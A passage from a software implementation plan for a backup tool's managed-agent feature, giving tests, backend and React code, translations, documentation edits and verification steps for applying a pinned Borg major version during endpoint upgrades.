def test_a_satisfied_borg_pin_clears_the_upgrade(test_db):
    agent = _requested(
        test_db,
        reported="0.1.3",
        requested_at=datetime.now(timezone.utc),
        desired_borg="2",
        borg_versions=[
            {"major": 1, "version": "1.4.0", "path": "/usr/local/bin/borg"},
            {"major": 2, "version": "2.0.0b14", "path": "/usr/local/bin/borg2"},
        ],
    )

    resolve_agent_upgrade(agent)

    assert agent.upgrade_state == "idle"
    assert agent.upgrade_requested_at is None


def test_a_borg_pin_with_no_reported_binaries_leaves_it_requested(test_db):
    """Silence is not success. An endpoint that reports no Borg at all has not
    installed the pinned one, and the timeout is what resolves it."""
    agent = _requested(
        test_db,
        reported="0.1.3",
        requested_at=datetime.now(timezone.utc),
        desired_borg="2",
        borg_versions=None,
    )

    resolve_agent_upgrade(agent)

    assert agent.upgrade_state == "requested"


def test_an_unpinned_endpoint_still_resolves_on_the_agent_version_alone(test_db):
    """The normal case must not start depending on reported Borg binaries."""
    agent = _requested(
        test_db,
        reported="0.1.2",
        requested_at=datetime.now(timezone.utc),
        borg_versions=None,
    )
    agent.agent_version = "0.1.3"

    resolve_agent_upgrade(agent)

    assert agent.upgrade_state == "idle"


def test_the_agent_version_still_has_to_match_a_satisfied_borg_pin(test_db):
    """Both halves of the target, not either."""
    agent = _requested(
        test_db,
        reported="0.1.2",
        requested_at=datetime.now(timezone.utc),
        desired_borg="2",
        borg_versions=[{"major": 2, "version": "2.0.0b14", "path": "/usr/local/bin/borg2"}],
    )

    resolve_agent_upgrade(agent)

    assert agent.upgrade_state == "requested"
```

And the predicate's own table, appended to
`tests/unit/test_agent_upgrade_columns.py` or a new
`tests/unit/test_borg_pin_satisfied.py`; put it in the latter so the version
comparison tests stay one file per question:

```python
"""Whether the Borg major an endpoint is pinned to has actually landed."""

import pytest

from app.core.agent_versions import borg_pin_satisfied


def binary(major: int) -> dict:
    return {"major": major, "version": f"{major}.0.0", "path": "/usr/local/bin/borg"}


@pytest.mark.parametrize(
    "desired,reported,expected",
    [
        (None, None, True),
        (None, [binary(1)], True),
        ("1", [binary(1)], True),
        ("2", [binary(2)], True),
        ("2", [binary(1), binary(2)], True),
        ("2", [binary(1)], False),
        ("2", [], False),
        ("2", None, False),
        # The agent sends major as an int; the pin is stored as a string.
        ("2", [{"major": 2}], True),
        ("2", [{"major": "2"}], True),
        # Junk in the reported list must not raise out of a heartbeat.
        ("2", [None, "borg2", {"version": "2.0.0"}], False),
        ("2", [None, binary(2)], True),
    ],
)
def test_borg_pin_satisfied(desired, reported, expected):
    assert borg_pin_satisfied(desired=desired, reported=reported) is expected
```

- [x] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/unit/test_borg_pin_satisfied.py tests/unit/test_agent_upgrade_reconciliation.py -q`
Expected: FAIL at import for the predicate, and
`test_an_unsatisfied_borg_pin_leaves_it_requested` FAILs with
`upgrade_state == "idle"`.

- [x] **Step 3: Add the predicate**

At the end of `app/core/agent_versions.py`:

```python
def borg_pin_satisfied(
    *, desired: Optional[str], reported: Optional[list] = None
) -> bool:
    """Whether the Borg major an endpoint is pinned to is one it reports.

    No pin is satisfied by anything: an endpoint that tracks whatever is
    installed has nothing to wait for.

    A pin and no reported binaries is not satisfied. Silence is not success:
    the endpoint has told us nothing to compare, and clearing an upgrade on it
    would report a Borg move that may not have happened. The upgrade timeout
    (spec section 7.1) is what resolves that case, honestly, as failed.

    The reported list arrives from an agent heartbeat, so anything in it may be
    malformed and must not raise: an entry that is not a mapping with a major
    simply does not match.
    """
    if not desired:
        return True
    for entry in reported or []:
        if not isinstance(entry, dict):
            continue
        major = entry.get("major")
        if major is not None and str(major) == str(desired):
            return True
    return False
```

- [x] **Step 4: Wait for the pin in `resolve_agent_upgrade`**

In `app/api/agents.py`, import the predicate alongside the existing version
helpers and extend the check (`:153-162`), replacing the docstring's last
paragraph rather than appending to it:

```python
def resolve_agent_upgrade(agent: AgentMachine) -> None:
    """Clear a requested upgrade when the endpoint comes back on its target.

    The agent is killed by the thing it is reporting on, so the server owns the
    outcome. An endpoint that comes back on the old version is left in
    `requested`: the reinstall may still be mid flight, and only the timeout
    resolves it.

    An endpoint already marked `failed` is cleared too when it turns up on the
    target version. The agent can be killed before its acknowledgement reaches
    the server, and the timeout is a guess by construction, so the version the
    endpoint actually reports outranks either.

    The target has two halves once an endpoint carries a Borg pin. A Borg only
    change leaves `agent_version` alone, so matching on it would resolve such
    an upgrade on the endpoint's next heartbeat, before the reinstall had done
    anything. The caller must therefore have already stored this heartbeat's
    `borg_versions`, or the pin is read against the previous report.
    """
    if agent.upgrade_state not in ("requested", "failed"):
        return
    if (
        agent.upgrade_target_version
        and agent.agent_version == agent.upgrade_target_version
        and borg_pin_satisfied(
            desired=agent.desired_borg_version, reported=agent.borg_versions
        )
    ):
        agent.upgrade_state = "idle"
        agent.upgrade_error = None
        agent.upgrade_requested_at = None
```

- [x] **Step 5: Move both call sites below the `borg_versions` assignment**

Heartbeat (`:1388-1395`) becomes:

```python
    now = _now_utc()
    current_agent.hostname = payload.hostname or current_agent.hostname
    current_agent.agent_version = payload.agent_version or current_agent.agent_version
    current_agent.timezone = (
        _validated_timezone(payload.timezone) or current_agent.timezone
    )
    current_agent.borg_versions = payload.borg_versions
    # After borg_versions: an endpoint with a Borg pin is only up to date once
    # this heartbeat's binaries include the pinned major.
    resolve_agent_upgrade(current_agent)
```

Hello (`:1458-1464`) takes the same move, with the same comment.

- [x] **Step 6: Run the tests to verify they pass**

Run: `pytest tests/unit/test_borg_pin_satisfied.py tests/unit/test_agent_upgrade_reconciliation.py tests/unit/test_api_agents.py tests/unit/test_agent_upgrade_waves.py tests/unit/test_api_agent_upgrade.py -q`
Expected: PASS. The agent API tests are in the list because the call sites
moved inside the two hottest handlers in that module.

---

## Task 4: The card says whether the pinned Borg major has landed

Spec section 9 puts the comparison next to the agent version chips, and
section 10 says it reuses the chip pattern. The shared part is `agentChipSx`
and the MUI `Chip` conventions; the vocabulary is its own.

The pin select itself already ships (phase 3,
`frontend/src/pages/managed-agents/AgentPinControl.tsx:118-140`) and needs no
change beyond its hint copy, which currently promises the choice is "applied by
a later release". This is that release.

**Files:**
- Create: `frontend/src/pages/managed-agents/AgentBorgVersionChip.tsx`
- Create: `frontend/src/pages/managed-agents/AgentBorgVersionChip.stories.tsx`
- Create: `frontend/src/pages/managed-agents/__tests__/AgentBorgVersionChip.test.tsx`
- Modify: `frontend/src/pages/ManagedAgents.tsx` (the chip row in `AgentList`,
  `:1823-1838`; the import block at `:73-77`)
- Modify: `frontend/src/locales/en.json`, `de.json`, `es.json`, `it.json`
- Modify: `frontend/src/pages/managed-agents/__tests__/AgentPinControl.test.tsx`
  only if it asserts the old hint text

**Interfaces:**
- Consumes: `AgentMachineResponse.desired_borg_version` and `.borg_versions`,
  both already on the response (`frontend/src/services/api.ts:1195`, `:1203`).
  No API change in this task.
- Produces: `<AgentBorgVersionChip desiredBorgVersion borgVersions />`,
  rendering `null` when there is no pin.

- [x] **Step 1: Write the failing tests**

Create `frontend/src/pages/managed-agents/__tests__/AgentBorgVersionChip.test.tsx`:

```tsx
import { describe, expect, it } from 'vitest'
import { screen } from '@testing-library/react'
import { renderWithProviders } from '../../../test/test-utils'
import AgentBorgVersionChip from '../AgentBorgVersionChip'

describe('AgentBorgVersionChip', () => {
  it('renders nothing when the endpoint has no Borg pin', () => {
    const { container } = renderWithProviders(
      <AgentBorgVersionChip
        desiredBorgVersion={null}
        borgVersions={[{ major: 1, version: '1.4.0' }]}
      />
    )
    expect(container).toBeEmptyDOMElement()
  })

  it('says the pin is pending when the endpoint does not report that major', () => {
    renderWithProviders(
      <AgentBorgVersionChip
        desiredBorgVersion="2"
        borgVersions={[{ major: 1, version: '1.4.0' }]}
      />
    )
    expect(screen.getByText(/borg 2 pending/i)).toBeInTheDocument()
  })

  it('names the pin once the endpoint reports that major', () => {
    renderWithProviders(
      <AgentBorgVersionChip
        desiredBorgVersion="2"
        borgVersions={[
          { major: 1, version: '1.4.0' },
          { major: 2, version: '2.0.0b14' },
        ]}
      />
    )
    expect(screen.getByText('Borg 2')).toBeInTheDocument()
  })

  it('treats no reported binaries as pending rather than satisfied', () => {
    renderWithProviders(<AgentBorgVersionChip desiredBorgVersion="2" borgVersions={null} />)
    expect(screen.getByText(/borg 2 pending/i)).toBeInTheDocument()
  })

  it('matches a major reported as a string', () => {
    renderWithProviders(
      <AgentBorgVersionChip desiredBorgVersion="2" borgVersions={[{ major: '2' }]} />
    )
    expect(screen.getByText('Borg 2')).toBeInTheDocument()
  })

  it('survives a malformed entry in the reported list', () => {
    renderWithProviders(
      <AgentBorgVersionChip
        desiredBorgVersion="2"
        borgVersions={[null as unknown as Record<string, unknown>, { major: 2 }]}
      />
    )
    expect(screen.getByText('Borg 2')).toBeInTheDocument()
  })
})
```

Add to `frontend/src/pages/__tests__/ManagedAgents.test.tsx`, in the block
that renders `AgentList`, following the file's existing fixture helper:

```tsx
  it('shows a pending Borg pin on the card', () => {
    renderAgentList([
      agentFixture({
        desired_borg_version: '2',
        borg_versions: [{ major: 1, version: '1.4.0' }],
      }),
    ])
    expect(screen.getByText(/borg 2 pending/i)).toBeInTheDocument()
  })
```

Read the file first and reuse whatever its existing render helper and fixture
builder are actually called; the names above are the shape, not a promise.

- [x] **Step 2: Run the tests to verify they fail**

Run: `cd frontend && npx vitest run src/pages/managed-agents/__tests__/AgentBorgVersionChip.test.tsx`
Expected: FAIL, cannot resolve `../AgentBorgVersionChip`.

- [x] **Step 3: Write the component**

Create `frontend/src/pages/managed-agents/AgentBorgVersionChip.tsx`:

```tsx
import { Chip, Tooltip } from '@mui/material'
import { useTranslation } from 'react-i18next'
import { agentChipSx } from './agentChipSx'

/**
 * Whether the Borg major version an endpoint is pinned to has actually landed.
 *
 * The rule is the same one `borg_pin_satisfied` applies in
 * `app/core/agent_versions.py`, which decides when a requested upgrade is
 * resolved. It is duplicated rather than sent as a computed field because the
 * response already carries both halves, and the two must be changed together.
 *
 * Renders nothing without a pin. An endpoint that tracks whatever is installed
 * has nothing to compare against, and the card's stats row already lists the
 * Borg binaries it reports.
 */
export default function AgentBorgVersionChip({
  desiredBorgVersion,
  borgVersions,
}: {
  desiredBorgVersion?: string | null
  borgVersions?: Array<Record<string, unknown>> | null
}) {
  const { t } = useTranslation()

  if (!desiredBorgVersion) return null

  // The agent reports `major` as a number and the pin is stored as a string,
  // so compare as strings. Entries arrive from a heartbeat, so an entry that
  // is not an object simply does not match rather than throwing.
  const satisfied = (borgVersions ?? []).some(
    (binary) =>
      Boolean(binary) &&
      binary.major !== undefined &&
      binary.major !== null &&
      String(binary.major) === String(desiredBorgVersion)
  )

  const label = satisfied
    ? t('managedAgents.page.borgPin.active', { version: desiredBorgVersion })
    : t('managedAgents.page.borgPin.pending', { version: desiredBorgVersion })
  const tooltip = satisfied
    ? t('managedAgents.page.borgPin.activeTooltip', { version: desiredBorgVersion })
    : t('managedAgents.page.borgPin.pendingTooltip', { version: desiredBorgVersion })

  return (
    <Tooltip title={tooltip} arrow>
      <span>
        <Chip
          size="small"
          variant="outlined"
          color={satisfied ? 'info' : 'warning'}
          label={label}
          sx={agentChipSx}
        />
      </span>
    </Tooltip>
  )
}
```

- [x] **Step 4: Add the i18n keys to all four locales**

Under `managedAgents.page`, a new `borgPin` object. English:

```json
"borgPin": {
  "active": "Borg {{version}}",
  "activeTooltip": "Pinned to Borg {{version}}, which this endpoint reports.",
  "pending": "Borg {{version}} pending",
  "pendingTooltip": "Pinned to Borg {{version}}, which this endpoint does not report yet. The next upgrade installs it."
}
```

German:

```json
"borgPin": {
  "active": "Borg {{version}}",
  "activeTooltip": "Auf Borg {{version}} festgelegt, und dieser Endpunkt meldet diese Version.",
  "pending": "Borg {{version}} ausstehend",
  "pendingTooltip": "Auf Borg {{version}} festgelegt, aber dieser Endpunkt meldet die Version noch nicht. Das nächste Upgrade installiert sie."
}
```

Spanish:

```json
"borgPin": {
  "active": "Borg {{version}}",
  "activeTooltip": "Fijado a Borg {{version}}, la versión que informa este endpoint.",
  "pending": "Borg {{version}} pendiente",
  "pendingTooltip": "Fijado a Borg {{version}}, pero este endpoint todavía no informa esa versión. La próxima actualización la instalará."
}
```

Italian:

```json
"borgPin": {
  "active": "Borg {{version}}",
  "activeTooltip": "Fissato a Borg {{version}}, la versione che questo endpoint segnala.",
  "pending": "Borg {{version}} in attesa",
  "pendingTooltip": "Fissato a Borg {{version}}, ma questo endpoint non segnala ancora quella versione. Il prossimo aggiornamento la installerà."
}
```

Then replace `managedAgents.page.pinControl.borgHint` in all four, which
currently says the choice is applied by a later release:

- `en`: `"The Borg choice applies at the next upgrade of this endpoint."`
- `de`: `"Die Borg-Auswahl wird beim nächsten Upgrade dieses Endpunkts angewendet."`
- `es`: `"La elección de Borg se aplica en la próxima actualización de este endpoint."`
- `it`: `"La scelta di Borg viene applicata al prossimo aggiornamento di questo endpoint."`

- [x] **Step 5: Render it on the card**

In `frontend/src/pages/ManagedAgents.tsx`, import it with the other agent
chips (`:73-77`, alphabetical in that block):

```tsx
import AgentBorgVersionChip from './managed-agents/AgentBorgVersionChip'
```

In `AgentList`'s chip row, directly after the `AgentUpgradeChip` block
(`:1823-1829`) and before `AgentManualUpgradeChip`:

```tsx
                      <AgentBorgVersionChip
                        desiredBorgVersion={agent.desired_borg_version}
                        borgVersions={agent.borg_versions}
                      />
```

It is unconditional here because the component itself decides whether there is
anything to show, which keeps the one rule in one place.

- [x] **Step 6: Write the stories**

Create `frontend/src/pages/managed-agents/AgentBorgVersionChip.stories.tsx`,
matching `AgentUpgradeStateChip.stories.tsx`:

```tsx
import type { Meta, StoryObj } from '@storybook/react-vite'
import { Stack } from '@mui/material'
import AgentBorgVersionChip from './AgentBorgVersionChip'

const meta: Meta<typeof AgentBorgVersionChip> = {
  title: 'Managed Agents/AgentBorgVersionChip',
  component: AgentBorgVersionChip,
}
export default meta

type Story = StoryObj<typeof AgentBorgVersionChip>

export const BothStates: Story = {
  render: () => (
    <Stack direction="row" spacing={1} sx={{ alignItems: 'center' }}>
      <AgentBorgVersionChip desiredBorgVersion="2" borgVersions={[{ major: 1 }]} />
      <AgentBorgVersionChip
        desiredBorgVersion="2"
        borgVersions={[{ major: 1 }, { major: 2 }]}
      />
    </Stack>
  ),
}

export const Pending: Story = {
  args: { desiredBorgVersion: '2', borgVersions: [{ major: 1, version: '1.4.0' }] },
}

export const Active: Story = {
  args: {
    desiredBorgVersion: '2',
    borgVersions: [{ major: 2, version: '2.0.0b14' }],
  },
}
```

- [x] **Step 7: Run the tests to verify they pass**

```bash
cd frontend
npx vitest run src/pages/managed-agents/__tests__ src/pages/__tests__/ManagedAgents.test.tsx
npm run lint
npx tsc --noEmit
```
Expected: PASS, clean.

---

## Task 5: Documentation

No API shape changes in this phase, so `docs/api.md` and the Postman
collection need nothing: `desired_borg_version` is already documented on the
pin route and already returned on the agent response. What changes is what the
value does, which lives in `docs/managed-agents.md`.

**Files:**
- Modify: `docs/managed-agents.md` (the "Pinning an Agent Version" section at
  `:201-226`)

- [x] **Step 1: Replace the deferral paragraph**

`docs/managed-agents.md:210-211` currently reads "The Borg choice is recorded
now and takes effect in a later release, once an upgrade can change the
installed Borg version." Replace those two lines with:

```markdown
The Borg choice takes effect at that endpoint's next upgrade. Pinning Borg 2
on an endpoint running Borg 1 does not change anything by itself: press
Upgrade on the row, and the reinstall installs the pinned major version. The
row shows "Borg 2 pending" until the endpoint reports it.

A Borg pin outranks how the endpoint was installed. An endpoint installed with
`--skip-borg-install` still gets the pinned version, and an endpoint that took
Borg 1 from distribution packages gets a pinned Borg 2 from this server's
static binaries, because no distribution ships Borg 2.

Because the upgrade is only complete once the endpoint reports the pinned
major version, a Borg pin that cannot be installed shows up as a failed
upgrade once the timeout elapses, rather than as a success that changed
nothing.
```

- [x] **Step 2: Note the Borg field on the API example**

After the `desired_agent_version` sentence at `:223-226`, add:

```markdown
`desired_borg_version` takes `"1"`, `"2"`, or `null` to leave whatever is
installed alone. It is applied by the next upgrade of that endpoint, not by
this call.
```

- [x] **Step 3: Check for em dashes in what was added**

Run: `git diff -U0 origin/main -- docs | grep -nP '\xe2\x80\x94'`
Expected: no output. The section already contains one em dash at `:46`, which
is pre-existing and out of scope.

---

## Task 6: Spec bookkeeping

Two rows, and the first is a debt this phase inherits.

**Files:**
- Modify: `docs/engineering/specs/2026-09-07-centralized-agent-upgrades.md`
  (the 13.1 progress table at `:549-554`)

- [x] **Step 1: Mark phase 4 done**

Phase 4 merged as PR #997 (approved, squashed to `a640a11e` on `main`,
including the review fixes) but its row still reads `in review`. Set it to
`done`, keeping the plan path, the branch and the existing note.

- [x] **Step 2: Carry phase 5 through its states**

Set phase 5's row to `plan drafted` with this plan's path and the branch
`feat/agent-upgrades-phase-5` as soon as this plan is written, then to
`plan approved` at gate G1, `in progress` when Task 1 starts, `in review`
when verification passes, and `done` at the merge. Record the seven decisions
from the top of this plan in the Notes column, condensed, along with the fact
that `resolve_agent_upgrade`'s call sites moved below the `borg_versions`
assignment.

---

## Verification (before gate G2)

- [x] **Step 1: The suites this phase touches**

```bash
python3 -m pytest tests/unit/test_agent_installer_pins.py \
  tests/unit/test_agent_installer_borg_override.py \
  tests/unit/test_agent_installer_api.py \
  tests/unit/test_agent_upgrade_helper.py \
  tests/unit/test_borg_pin_satisfied.py \
  tests/unit/test_agent_upgrade_reconciliation.py \
  tests/unit/test_agent_upgrade_command.py \
  tests/unit/test_agent_upgrade_waves.py \
  tests/unit/test_api_agent_upgrade.py \
  tests/unit/test_api_agents.py \
  tests/unit/test_api_managed_machines.py -q
```

- [x] **Step 2: The whole backend suite**

```bash
python3 -m pytest tests/unit -q
```

Run it from the worktree root. Three `test_db_upgrade.py` tests skip without
`BORG_TEST_POSTGRES_URL`, which is expected. If `test_api_auth` failures
appear, check for a local `.env` setting `PUBLIC_BASE_URL` before treating
them as a regression.

- [x] **Step 3: Frontend**

```bash
cd frontend
npx vitest run
npm run lint
npx tsc --noEmit
npm run build
```

Storybook snapshots need Node 20.19+ via fnm before `npm run snapshots`.

- [x] **Step 4: No em dashes in added lines**

```bash
git diff -U0 origin/main | grep -nP '\xe2\x80\x94'
```
Expected: no output.

- [ ] **Step 5: Verify the phase gate by hand**

The gate (spec 13.6) is: an operator moves an endpoint from Borg 1 to Borg 2
from the UI. With the local stack running and one endpoint enrolled on Borg 1
that reports `self_upgrade`:

1. Open the pin dialog on its row, set Borg version to Borg 2, save. The row
   shows "Borg 2 pending".
2. Press Upgrade on the row and confirm. The row shows "Upgrading".
3. Confirm the served script is per endpoint:
   `curl -s "$BASE_URL/agent/install.sh?agent_id=<agent_id>" | grep PINNED_DESIRED_BORG_VERSION`
   prints `PINNED_DESIRED_BORG_VERSION="2"`, and the same request without the
   query parameter prints an empty value.
4. When the endpoint comes back, it reports a `major: 2` binary, the row
   clears to up to date, and the chip reads "Borg 2".
5. On the endpoint, `grep BORG_INSTALL_MODE /etc/borg-ui-agent-upgrade.conf`
   reads `"2"`, so the choice survives the next upgrade.

Per the memory note on throwaway backends: strip notifications, MQTT,
schedules and pending jobs from any copied database before pointing a local
backend at it.

- [ ] **Step 6: Stop at gate G2**

Show the verification output and ask whether to commit. Nothing is committed
or pushed without that answer (`.claude/instructions.md`). One commit for the
phase:

```bash
git add app frontend docs tests
git commit -m "feat(agents): apply a per-endpoint Borg version on upgrade (phase 5)"
```

---

## Self-review

Checked against the spec after writing:

**Spec coverage.** Section 10 has all three of its parts: the write-through
(Tasks 1 and 2), the chip (Task 4), and the selector (already shipped in
phase 3, its copy corrected in Task 4). Section 6's "the server resolves which
versions to pin into the script it serves, from the endpoint's stored
`desired_agent_version` and `desired_borg_version`" is Task 1, and this is the
phase where the `agent_id` the helper already sends starts being read. Section
7.1's outcome ownership is extended rather than reworked in Task 3. Section 12
asks for "Version resolution: the installer served to a pinned endpoint carries
that endpoint's pinned versions, and the one served to an unpinned endpoint
carries the wheel this server ships", which is
`test_a_pinned_endpoint_gets_its_own_versions` and
`test_an_unpinned_endpoint_gets_the_served_wheel`. Section 11.2's "a
compromised agent cannot influence what gets installed" is why Task 1
whitelists both pins at render time. Sections 4 and 5 need no change: the
`upgrade_status` matrix is about the agent wheel, and no response field is
added.

**Not in this phase, deliberately.** `upgrade_status` does not gain a Borg
dimension. Spec section 4's matrix is defined over agent versions, and the
chip carries the Borg comparison instead. The banner's outdated count
therefore does not count an endpoint whose only difference is an unsatisfied
Borg pin, which matches the banner copy ("running an older agent").

**Placeholder scan.** No TBDs. Every step carries the code it needs, except
the two additions to existing test files in Task 4 Step 1, which say to read
the file and reuse its own fixture helpers rather than inventing names; the
assertion under test is given in full.

**Type consistency.** `InstallerPins` fields are `agent_version` and
`desired_borg_version` in Task 1 and are read under those names in
`render_installer_script`. `borg_pin_satisfied(*, desired, reported)` is
keyword-only in Task 3's definition, its test, and its call site. The chip's
props are `desiredBorgVersion` and `borgVersions` in the component, its tests,
its stories, and the call site in `ManagedAgents.tsx`.
`PINNED_DESIRED_BORG_VERSION` is spelled the same in Tasks 1 and 2 and in both
test files.

---

## Open questions

Defaults are what this plan implements. They are the seven decisions at the top
of the plan, restated here for the gate.

1. **Is `desired_agent_version` write-through in scope?** Default: yes, in
   Task 1, since it is the same rendering change and spec section 6 requires
   it. Say so at G1 if phase 5 should be Borg only, in which case Task 1 keeps
   `PINNED_AGENT_VERSION` on `agent_package_version()` and drops the two
   agent-pin tests.
2. **Snapshot the Borg target, or read the live pin?** Default: live pin, no
   new column and no migration.
3. **Does a Borg pin beat `--skip-borg-install`?** Default: yes.
4. **Does a pin to Borg 2 override a recorded `BORG_SOURCE=distro`?**
   Default: yes, falling back to the server's static binaries.
5. **Does `/agent/install.sh?agent_id=` need authentication?** Default: no,
   unchanged from phase 2, with an unknown id rendering the unpinned script.
6. **Own chip component or a mode of `AgentUpgradeChip`?** Default: own
   component.
7. **Show the chip on unpinned endpoints?** Default: no.
